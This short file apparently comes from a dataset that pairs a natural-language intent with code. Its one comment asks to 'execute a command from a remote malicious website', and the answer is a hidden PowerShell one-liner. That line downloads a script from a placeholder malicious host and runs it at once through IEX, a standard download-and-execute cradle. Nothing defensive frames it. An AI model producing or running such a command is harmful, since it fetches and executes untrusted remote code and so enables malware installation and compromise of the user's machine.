# Natural language intent:
# Execute a command from a remote malicious website

powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/malicious-script.ps1')"
